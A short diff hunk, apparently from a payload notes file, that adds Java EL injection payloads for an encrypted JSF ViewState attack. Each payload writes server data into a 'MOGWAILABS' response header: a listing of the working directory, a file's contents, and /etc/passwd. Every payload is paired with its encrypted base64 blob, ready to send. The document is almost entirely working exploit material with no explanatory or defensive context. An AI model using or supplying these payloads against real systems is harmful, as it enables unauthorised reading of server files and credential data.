@@ -193,3 +193,12 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", java.util.Arrays.toString(new java.io.File(System.getProperty(\"user.dir\")).list()))}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70/K2EGPqhiskwkdXczSekVbj9IDBNJ1A2+i7stC6mqByTlBxayF9P8lrue+FLoMqKOIsXdVUIC+O96taGLgyp03kqFnQ0+y5gOU1xdWBUea2SUAQcM9Zxr0Ah4jlEIs//w==
+
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", new java.util.Scanner(new java.io.FileInputStream(System.getProperty(\"user.dir\") + \"/filename.txt\"), \"UTF-8\").useDelimiter(\"\\\\A\").next())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70zyWF0MVT37DZc1LFEcEY3OVNTi22+Lki8HrzPO53Va7WeTRW8p882EK+0AcvWx/djWiAr1CveMiovraNT6BsUW13ErHQyqaESUk6sozDha0daQVcSHNwDqBnyYu8qCf1UWtbCYlkh1Fub079F4C/8I4g5EUohqxK9UFfmMbgI5N9lXe+WtaKGXczvpA7i8twg==
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", new java.util.Scanner(new java.io.FileInputStream(\"/etc/passwd\"), \"UTF-8\").useDelimiter(\"\\\\A\").next())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70zyWF0MVT37DZc1LFEcEY3OVNTi22+Lki8HrzPO53Va7WeTRW8p882EK+0AcvWx/dosDpl5jPn6GnFfbiDuncshcdcViXFgHPzfuVLPM3TJ/PmqVFG++H4yWHbfr1ysbIZq7tXq5Gc4RKDS0Z//c34I=
